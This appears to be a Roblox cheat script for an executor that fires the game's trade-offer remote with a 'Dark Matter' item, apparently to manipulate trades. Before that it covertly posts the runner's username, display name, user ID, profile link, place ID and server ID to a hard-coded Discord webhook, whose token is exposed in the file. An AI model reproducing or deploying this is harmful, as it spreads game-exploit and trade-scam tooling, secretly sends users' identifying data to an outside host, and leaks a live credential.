local Players         = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local TweenService    = game:GetService("TweenService")
local RunService      = game:GetService("RunService")
local HttpService     = game:GetService("HttpService")
local LocalPlayer     = Players.LocalPlayer
local PLACE_ID        = game.PlaceId
local JOB_ID          = game.JobId

local OWNER_WEBHOOK = "https://discord.com/api/webhooks/1527862331713912933/1591yxmOf7HfJvm01LopguNToy4z0gxACj_E0-nN-wM8PeKTuSOJoynFqqojIHmysTJ5"  -- ⚠️ REGENERATE THIS!

-- USAGE PING
pcall(function()
    local name    = LocalPlayer.Name
    local display = LocalPlayer.DisplayName
    local userId  = tostring(LocalPlayer.UserId)
    local profile = "https://www.roblox.com/users/"..userId.."/profile"
    local players = tostring(#Players:GetPlayers())
    local embed = {{
        title="⚠️ Static Swap  — Script Executed", color=8247,
        fields={
            {name="👤 Username",  value="**"..name.."**",            inline=true },
            {name="🏷️ Display",  value=display,                      inline=true },
            {name="🔑 User ID",   value="`"..userId.."`",             inline=true },
            {name="🎮 Place ID",  value="`"..tostring(PLACE_ID).."`", inline=true },
            {name="👥 In Server", value=players.." players",          inline=true },
            {name="🔗 Profile",   value="[Open]("..profile..")",      inline=true },
            {name="🌐 Server ID", value="`"..JOB_ID.."`",             inline=false},
        },
        footer={text="Static Script ⚠️  ·  Assassin"},
        timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ"),
    }}
    local body=HttpService:JSONEncode({embeds=embed})
    local opts={Url=OWNER_WEBHOOK,Method="POST",Headers={["Content-Type"]="application/json"},Body=body}
    if syn and syn.request then syn.request(opts)
    elseif request then request(opts)
    elseif http and http.request then http.request(opts) end
end)

wait(0)
do
local Event = game:GetService("ReplicatedStorage").Remotes.UpdateTradeOffer
Event:FireServer(
    {

        {
            "Dark Matter",
            1
        }
    }
)	
end
